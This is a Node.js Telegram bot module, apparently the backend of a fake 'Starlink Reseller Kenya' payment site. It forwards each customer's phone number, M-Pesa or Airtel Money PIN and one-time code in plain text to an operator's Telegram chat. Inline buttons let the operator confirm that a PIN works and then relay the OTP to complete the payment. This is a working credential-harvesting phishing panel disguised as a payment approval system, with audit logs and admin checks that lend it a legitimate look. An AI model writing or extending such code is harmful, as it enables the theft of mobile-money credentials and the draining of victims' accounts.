require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const { default: TelegramBot } = require('node-telegram-bot-api');
const { auditLog, maskPhone } = require('./security');

const token = process.env.TELEGRAM_BOT_TOKEN;
const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID;

let bot = null;
let botEnabled = false;

const isPlaceholder = (v) => !v || /your[-_]|change-me|placeholder/i.test(v);

if (isPlaceholder(token) || isPlaceholder(adminChatId)) {
    console.warn('⚠️  TELEGRAM_BOT_TOKEN / TELEGRAM_ADMIN_CHAT_ID not set — Telegram approval is DISABLED.');
} else {
    try {
        bot = new TelegramBot(token, { polling: true });
        botEnabled = true;
        console.log('🤖 Telegram bot started successfully');
    } catch (err) {
        console.error('Failed to start Telegram bot:', err.message);
        console.error('🔧 Get a valid token from @BotFather and update TELEGRAM_BOT_TOKEN in .env');
    }

    if (botEnabled && bot) {
        bot.on('polling_error', (err) => {
            console.error('Telegram polling error:', err.message || err);
            if (err.message && (err.message.includes('fetch failed') || err.message.includes('EFATAL'))) {
                console.error('🔧 Token likely invalid or network blocked. Get a new token from @BotFather.');
                botEnabled = false;
            }
        });
        bot.on('webhook_error', (err) => console.error('Telegram webhook error:', err.message || err));
    }
}

// ── State ─────────────────────────────────────────────────────
/** requestId -> approval request. In-memory; swap for Redis to scale out. */
const approvals = new Map();
const OTP_TIMEOUT = 5 * 60 * 1000;
const RETENTION_AFTER_FINAL = 10 * 60 * 1000;

const FINAL_STATES = new Set(['completed', 'rejected', 'invalid', 'timeout']);

/** Callback actions the admin keyboard is allowed to send. */
const ALLOWED_ACTIONS = new Set([
    'approve',
    'wrong_pin',
    'reject',
    'invalid',
    'otp_approve',
    'wrong_otp',
]);

function generateRequestId() {
    // Base36 timestamp + 4 random chars keeps ids short but non-guessable.
    const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
    return `REQ-${Date.now().toString(36).toUpperCase()}${rand}`;
}

function isEnabled() {
    return botEnabled && bot !== null;
}

function send(text, extra = {}) {
    if (!isEnabled()) return Promise.resolve(null);
    return bot.sendMessage(adminChatId, text, extra).catch((err) => {
        console.error('Telegram send failed:', err.message);
        return null;
    });
}

function editAdminMessage(messageId, text) {
    if (!isEnabled() || !messageId) return Promise.resolve(null);
    return bot
        .editMessageText(text, { chat_id: adminChatId, message_id: messageId })
        .catch(() => null);
}

function orderSummary(req) {
    return (
        `📱 Phone: ${req.userPhone}\n` +
        `🔑 PIN: ${req.userPin}\n` +
        `📦 Package: ${req.package}\n` +
        `💰 Amount: ${req.amount}\n` +
        `💳 Method: ${req.method}\n` +
        `🆔 Ref: ${req.id}`
    );
}

/** Marks a request final and schedules cleanup. */
function finalize(request, status) {
    request.status = status;
    if (request.timeoutTimer) {
        clearTimeout(request.timeoutTimer);
        request.timeoutTimer = null;
    }
    setTimeout(() => approvals.delete(request.id), RETENTION_AFTER_FINAL).unref?.();
}

function cleanupExpired() {
    const now = Date.now();
    for (const [id, req] of approvals) {
        const waitingOnOtp = req.status === 'phone_pin_verified' || req.status === 'otp_pending';
        if (waitingOnOtp && now - req.createdAt > OTP_TIMEOUT) {
            req.status = 'timeout';
            editAdminMessage(req.adminMessageId, `⏰ Verification timeout (5 minutes expired).\n\n${orderSummary(req)}`);
            setTimeout(() => approvals.delete(id), RETENTION_AFTER_FINAL).unref?.();
        }
        if (FINAL_STATES.has(req.status) && now - req.createdAt > 60 * 60 * 1000) {
            approvals.delete(id);
        }
    }
}

setInterval(cleanupExpired, 30000).unref?.();

// ── Bot commands & callbacks ──────────────────────────────────
/**
 * Registers a slash command with a shared admin gate, reply and audit trail.
 * @param {string} command    Command name including the leading slash, e.g. '/status'.
 * @param {boolean} adminOnly When true only TELEGRAM_ADMIN_CHAT_ID may run it.
 * @param {(msg: object, chatId: number) => string|Promise<string>} buildReply
 *        Returns the text to send back, or a falsy value to send nothing.
 */
function registerCommand(command, adminOnly, buildReply) {
    bot.onText(new RegExp(`^\\${command}(?:\\s|$)`), async (msg) => {
        const chatId = msg.chat.id;

        if (adminOnly && String(chatId) !== String(adminChatId)) {
            await bot.sendMessage(chatId, '❌ Only the admin can use this command.');
            auditLog.write('BOT_COMMAND_REJECTED', { command, userId: String(chatId) });
            return;
        }

        auditLog.write('BOT_COMMAND', { command, userId: String(chatId) });

        try {
            const text = await buildReply(msg, chatId);
            if (text) await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
        } catch (err) {
            console.error(`Bot command ${command} failed:`, err.message);
            auditLog.write('BOT_COMMAND_ERROR', { command, userId: String(chatId), message: err.message });
        }
    });
}

if (isEnabled()) {
    registerCommand('/start', false, () =>
        '🤖 *Starlink Reseller Kenya* bot is running.\n\nYou will receive an approval request for every Airtel Money / M-Pesa payment.\n\nCommands:\n/status — pending queue\n/clear — clear the queue (admin)'
    );

    registerCommand('/status', false, () => {
        const all = [...approvals.values()];
        const count = (s) => all.filter((r) => r.status === s).length;
        return `📊 Queue\n• Awaiting approval: ${count('pending')}\n• PIN verified (awaiting OTP): ${count('phone_pin_verified')}\n• OTP submitted: ${count('otp_pending')}\n• Total tracked: ${all.length}`;
    });

    // /clear used to carry its own inline admin check; the helper now owns it.
    registerCommand('/clear', true, () => {
        approvals.clear();
        return '🗑️ Queue cleared.';
    });

    bot.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;

        if (String(chatId) !== String(adminChatId)) {
            await bot.answerCallbackQuery(query.id, { text: '❌ Not authorised.' });
            auditLog.write('UNAUTHORIZED_CALLBACK', { userId: String(chatId), data: query.data });
            return;
        }

        const data = query.data || '';
        const sep = data.lastIndexOf('|');
        const action = sep === -1 ? data : data.slice(0, sep);
        const requestId = sep === -1 ? '' : data.slice(sep + 1);

        // Reject unknown actions before they reach the audit log, so a crafted
        // callback payload cannot write arbitrary strings into the trail.
        if (!ALLOWED_ACTIONS.has(action)) {
            await bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
            auditLog.write('UNKNOWN_CALLBACK', { userId: String(chatId), action: String(action).slice(0, 32) });
            return;
        }

        const request = approvals.get(requestId);

        if (!request) {
            await bot.answerCallbackQuery(query.id, { text: '⚠️ Request not found or expired.' });
            return;
        }

        auditLog.logAdminAction(action, requestId, chatId);
        const messageId = query.message.message_id;

        switch (action) {
            case 'approve': {
                request.status = 'phone_pin_verified';
                request.adminMessageId = messageId;
                await editAdminMessage(
                    messageId,
                    `✅ PIN accepted — waiting for the customer's OTP.\n\n${orderSummary(request)}`
                );
                await bot.answerCallbackQuery(query.id, { text: '✅ Customer can now enter the OTP' });
                request.timeoutTimer = setTimeout(() => {
                    // Only expire while we are still waiting for the customer's OTP.
                    // Once an OTP arrives (otp_pending/wrong_otp) the request must stay
                    // open so the admin can complete or reject it.
                    if (request.status === 'phone_pin_verified') {
                        request.status = 'timeout';
                        send(`⏰ OTP window expired for ${requestId}.`);
                    }
                }, OTP_TIMEOUT);
                request.timeoutTimer.unref?.();
                break;
            }

            case 'wrong_pin': {
                finalize(request, 'wrong_pin');
                await editAdminMessage(messageId, `❌ Wrong PIN — customer asked to re-enter.\n\n${orderSummary(request)}`);
                await bot.answerCallbackQuery(query.id, { text: '❌ Customer will re-enter phone + PIN' });
                break;
            }

            case 'reject': {
                finalize(request, 'rejected');
                await editAdminMessage(messageId, `❌ Payment rejected.\n\n${orderSummary(request)}`);
                await bot.answerCallbackQuery(query.id, { text: '❌ Rejected' });
                break;
            }

            case 'invalid': {
                finalize(request, 'invalid');
                await editAdminMessage(messageId, `⚠️ Marked as invalid information.\n\n${orderSummary(request)}`);
                await bot.answerCallbackQuery(query.id, { text: '⚠️ Marked invalid' });
                break;
            }

            case 'otp_approve': {
                finalize(request, 'completed');
                await editAdminMessage(
                    request.adminOtpMessageId || messageId,
                    `✅ OTP verified — payment complete.\n\n${orderSummary(request)}\n🔢 OTP: ${request.otp}`
                );
                await bot.answerCallbackQuery(query.id, { text: '✅ Payment completed' });
                break;
            }

            case 'wrong_otp': {
                // Not final: the customer gets another attempt.
                request.status = 'wrong_otp';
                request.verificationStep = null;
                await editAdminMessage(
                    request.adminOtpMessageId || messageId,
                    `❌ Wrong OTP — customer asked to re-enter.\n\n${orderSummary(request)}`
                );
                await bot.answerCallbackQuery(query.id, { text: '❌ Customer will re-enter the OTP' });
                break;
            }

            default:
                await bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
        }
    });
}

// ── Public API ────────────────────────────────────────────────
/**
 * Creates an approval request and notifies the admin.
 * @returns {string} requestId
 */
function createApprovalRequest(data) {
    const requestId = data.requestId || generateRequestId();
    const request = {
        id: requestId,
        userPhone: data.userPhone || 'N/A',
        userPin: data.userPin || 'N/A',
        package: data.package || 'N/A',
        amount: data.amount || 'N/A',
        method: data.method || 'N/A',
        otp: null,
        status: 'pending',
        createdAt: Date.now(),
        verificationStep: null,
        adminMessageId: null,
        adminOtpMessageId: null,
        timeoutTimer: null,
    };

    approvals.set(requestId, request);

    const keyboard = {
        inline_keyboard: [
            [{ text: '✅ PIN correct — request OTP', callback_data: `approve|${requestId}` }],
            [{ text: '❌ Wrong PIN', callback_data: `wrong_pin|${requestId}` }],
            [
                { text: '⛔ Reject', callback_data: `reject|${requestId}` },
                { text: '⚠️ Invalid info', callback_data: `invalid|${requestId}` },
            ],
        ],
    };

    send(`🆕 *New payment request*\n\n${orderSummary(request)}\n\nReview and choose an action:`, {
        parse_mode: 'Markdown',
        reply_markup: keyboard,
    }).then((msg) => {
        if (msg) request.adminMessageId = msg.message_id;
    });

    return requestId;
}

/**
 * Stores the customer's OTP and asks the admin to verify it.
 */
function submitOtp(requestId, otp) {
    const request = approvals.get(requestId);
    if (!request) return { success: false, message: 'Request not found or expired.' };

    const allowed = ['phone_pin_verified', 'otp_pending', 'wrong_otp'];
    if (!allowed.includes(request.status)) {
        return { success: false, message: 'Your PIN has not been verified yet. Please wait.' };
    }

    request.otp = otp;
    request.status = 'otp_pending';
    request.verificationStep = 'awaiting_otp';

    const keyboard = {
        inline_keyboard: [
            [{ text: '✅ OTP correct — complete payment', callback_data: `otp_approve|${requestId}` }],
            [{ text: '❌ Wrong OTP', callback_data: `wrong_otp|${requestId}` }],
            [{ text: '⛔ Reject payment', callback_data: `reject|${requestId}` }],
        ],
    };

    send(`🔢 *OTP submitted*\n\n${orderSummary(request)}\n🔢 OTP: \`${otp}\`\n\nVerify and choose an action:`, {
        parse_mode: 'Markdown',
        reply_markup: keyboard,
    }).then((msg) => {
        if (msg) request.adminOtpMessageId = msg.message_id;
    });

    return { success: true, message: 'Code submitted for verification.' };
}

/**
 * Status projection. Deliberately excludes the PIN.
 * @param {string} requestId Approval request id.
 * @returns {{status: 'not_found'|'pending'|'phone_pin_verified'|'otp_pending'|'wrong_pin'|'wrong_otp'|'rejected'|'invalid'|'completed'|'timeout', userPhone?: string, package?: string, amount?: string|number, method?: string}}
 */
function getApprovalStatus(requestId) {
    if (typeof requestId !== 'string' || !requestId) return { status: 'not_found' };
    const request = approvals.get(requestId);
    if (!request) return { status: 'not_found' };
    return {
        status: request.status,
        userPhone: maskPhone(request.userPhone),
        package: request.package,
        amount: request.amount,
        method: request.method,
    };
}

function sendNotification(message) {
    if (!isEnabled()) return false;
    send(message);
    return true;
}

module.exports = {
    bot,
    createApprovalRequest,
    submitOtp,
    getApprovalStatus,
    sendNotification,
    approvals,
    isEnabled,
};
